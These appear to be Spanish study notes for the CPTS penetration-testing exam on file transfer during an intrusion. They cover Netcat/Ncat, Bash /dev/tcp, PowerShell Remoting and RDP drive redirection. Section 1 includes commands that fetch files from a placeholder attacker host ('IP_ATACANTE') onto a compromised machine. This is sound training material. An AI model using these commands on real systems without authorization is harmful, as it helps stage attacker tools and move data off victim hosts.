
## 1. Transferencia de archivos con Netcat y Ncat

**Netcat (**`**nc**`**)** y **Ncat (**`**ncat**`**)** permiten transferir archivos mediante conexiones TCP. Son útiles cuando no disponemos de HTTP, SMB o SSH, siempre que podamos establecer una conexión entre las máquinas.

### Método 1: La máquina comprometida escucha y recibe el archivo

**En la máquina comprometida:**

Con Netcat:

```
nc -l -p 8000 > archivo.exe
```

Con Ncat:

```
ncat -l -p 8000 --recv-only > archivo.exe
```

La máquina queda escuchando en el puerto `8000` y guarda los datos recibidos en `archivo.exe`.

**En la máquina atacante:**

Con Netcat:

```
nc -q 0 IP_OBJETIVO 8000 < archivo.exe
```

Con Ncat:

```
ncat --send-only IP_OBJETIVO 8000 < archivo.exe
```

El operador `<` redirige el contenido del archivo a la entrada de Netcat, que lo transmite a la máquina comprometida.

### Método 2: La máquina atacante escucha y la comprometida se conecta

Este método puede ser útil cuando el firewall impide las conexiones entrantes a la máquina comprometida, pero permite que esta establezca conexiones salientes.

**En la máquina atacante:**

Con Netcat:

```
sudo nc -l -p 443 -q 0 < archivo.exe
```

Con Ncat:

```
sudo ncat -l -p 443 --send-only < archivo.exe
```

**En la máquina comprometida:**

Con Netcat:

```
nc IP_ATACANTE 443 > archivo.exe
```

Con Ncat:

```
ncat IP_ATACANTE 443 --recv-only > archivo.exe
```

La máquina comprometida inicia la conexión y recibe el contenido del archivo.

### Método 3: Recibir archivos mediante Bash y `/dev/tcp`

Si la máquina comprometida no dispone de Netcat ni Ncat, Bash puede utilizar `/dev/tcp` para establecer una conexión TCP.

**En la máquina atacante:**

```
sudo nc -l -p 443 -q 0 < archivo.exe
```

**En la máquina comprometida:**

```
cat < /dev/tcp/IP_ATACANTE/443 > archivo.exe
```

Bash abre una conexión TCP con el servidor indicado y `cat` lee los datos, que se guardan en el archivo de destino.

### Diferencias entre Netcat y Ncat

|Opción|Función|
|---|---|
|`-l`|Escuchar conexiones entrantes.|
|`-p`|Especificar el puerto local.|
|`-q 0`|En el Netcat original, cerrar la conexión inmediatamente después de terminar la entrada.|
|`--send-only`|En Ncat, enviar datos sin esperar recibir más información.|
|`--recv-only`|En Ncat, recibir datos sin enviar información de aplicación.|
|`< archivo`|Enviar el contenido del archivo como entrada del programa.|
|`> archivo`|Guardar la salida recibida en un archivo.|

**Importante:** Comprueba qué implementación tienes instalada. Las opciones disponibles pueden variar entre Netcat y Ncat.

## 2. Transferencia de archivos mediante PowerShell Remoting

PowerShell Remoting permite ejecutar comandos en equipos Windows remotos y transferir archivos mediante sesiones de PowerShell.

Utiliza WinRM, que escucha por defecto en:

|Protocolo|Puerto TCP|
|---|---|
|HTTP|5985|
|HTTPS|5986|

Para crear una sesión remota necesitamos permisos administrativos, pertenecer a `Remote Management Users` o disponer de los permisos adecuados para PowerShell Remoting.

### Paso 1. Comprobar la conectividad

Desde el equipo de origen:

```
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Si `TcpTestSucceeded` muestra `True`, el puerto TCP está accesible.

### Paso 2. Crear una sesión remota

```
$Session = New-PSSession -ComputerName DATABASE01
```

La sesión queda almacenada en la variable `$Session`.

Si no se utilizan las credenciales actuales, puede ser necesario proporcionar credenciales explícitamente:

```
$Cred = Get-Credential
$Session = New-PSSession -ComputerName DATABASE01 -Credential $Cred
```

### Paso 3. Subir un archivo al equipo remoto

Copiar `samplefile.txt` desde el equipo local al equipo remoto:

```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### Paso 4. Descargar un archivo desde el equipo remoto

Copiar `DATABASE.txt` desde el equipo remoto al equipo local:

```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### Parámetros importantes

|Parámetro|Función|
|---|---|
|`New-PSSession`|Crear una sesión remota de PowerShell.|
|`-ComputerName`|Especificar el equipo remoto.|
|`-Credential`|Proporcionar credenciales alternativas.|
|`Copy-Item`|Copiar archivos.|
|`-ToSession`|Copiar desde el equipo local hacia la sesión remota.|
|`-FromSession`|Copiar desde la sesión remota hacia el equipo local.|

**Clave para CPTS:** `-ToSession` y `-FromSession` indican la dirección de la transferencia desde la perspectiva del equipo donde se ejecuta `Copy-Item`.

## 3. Transferencia de archivos mediante RDP

El protocolo Remote Desktop Protocol (RDP) permite acceder remotamente a equipos Windows. También podemos aprovechar la sesión RDP para transferir archivos.

Existen dos métodos principales:

1. Copiar y pegar archivos entre los equipos.
    
2. Redirigir una carpeta local para acceder a ella desde la sesión remota.
    

### Método 1: Copiar y pegar

Cuando la redirección del portapapeles está habilitada, podemos copiar un archivo en un equipo y pegarlo en el otro.

Este método depende de la configuración de RDP y puede no funcionar en todos los entornos.

### Método 2: Compartir una carpeta mediante rdesktop

Desde Linux, podemos redirigir una carpeta local utilizando `rdesktop`:

```
rdesktop IP_OBJETIVO -d DOMINIO -u USUARIO -p 'CONTRASEÑA' -r disk:linux='/home/usuario/transferencias'
```

La carpeta local `/home/usuario/transferencias` quedará disponible en la sesión RDP remota como una unidad redirigida.

### Método 3: Compartir una carpeta mediante xfreerdp

```
xfreerdp /v:IP_OBJETIVO /d:DOMINIO /u:USUARIO /p:'CONTRASEÑA' /drive:linux,/home/usuario/transferencias
```

Parámetros importantes:

|Parámetro|Función|
|---|---|
|`/v:`|Dirección IP o nombre del servidor RDP.|
|`/d:`|Dominio.|
|`/u:`|Usuario.|
|`/p:`|Contraseña.|
|`/drive:`|Redirigir una carpeta local a la sesión remota.|

### Acceder a la carpeta desde Windows

Una vez establecida la conexión RDP, abre el Explorador de archivos y accede a:

```
\\tsclient\
```

Desde ahí podrás acceder a las unidades redirigidas y transferir archivos entre la máquina local y la remota.

### Método 4: Cliente RDP nativo de Windows

También podemos utilizar `mstsc.exe`.

En las opciones de conexión, accede a los recursos locales y selecciona las unidades que quieres compartir. Después, podrás acceder a ellas desde la sesión remota.

**Consideraciones de seguridad:**

- Windows Defender puede detectar y eliminar archivos maliciosos presentes en carpetas compartidas.
    
- La unidad redirigida no está disponible para otros usuarios que inicien sesión en el equipo remoto.
    
- No compartas directorios innecesarios: limita la exposición a los archivos que necesitas transferir.

## 4. Comparativa de métodos

|Método|Requisitos principales|Uso habitual|
|---|---|---|
|Netcat / Ncat|Herramienta disponible y conectividad TCP|Transferencias directas entre máquinas.|
|Bash `/dev/tcp`|Bash con soporte para redirecciones TCP|Alternativa cuando no hay Netcat.|
|PowerShell Remoting|WinRM habilitado y permisos adecuados|Transferencias entre equipos Windows.|
|RDP mediante portapapeles|Sesión RDP y redirección del portapapeles habilitada|Transferencias sencillas.|
|RDP mediante unidades compartidas|Cliente RDP compatible y redirección de unidades|Transferir varios archivos mediante una carpeta.|

## 5. Puntos clave para CPTS

- **Netcat/Ncat:** permiten enviar archivos mediante TCP utilizando redirecciones de entrada y salida.
    
- **Dirección de la conexión:** puedes hacer que escuche la máquina comprometida o tu máquina de ataque. Elige según las restricciones de conectividad.
    
- **Netcat frente a Ncat:** recuerda las diferencias entre `-q 0`, `--send-only` y `--recv-only`.
    
- **Bash** `**/dev/tcp**`**:** alternativa cuando Netcat no está disponible.
    
- **PowerShell Remoting:** utiliza `New-PSSession` para establecer la sesión y `Copy-Item` para transferir archivos.
    
- `**-ToSession**`**:** envía archivos desde el equipo local al remoto.
    
- `**-FromSession**`**:** recupera archivos desde el remoto al local.
    
- **WinRM:** comprueba la conectividad a los puertos TCP 5985 y 5986 según el protocolo configurado.
    
- **RDP:** puedes transferir archivos mediante el portapapeles o la redirección de unidades.
    
- `**\\tsclient\**`**:** permite acceder a las unidades locales compartidas dentro de una sesión RDP.
    
- **Firewalls:** antes de elegir un método, comprueba qué conexiones están permitidas y qué puertos son accesibles.
    
- **Verificación:** después de transferir un archivo, comprueba su tamaño o compara sus hashes para confirmar su integridad.
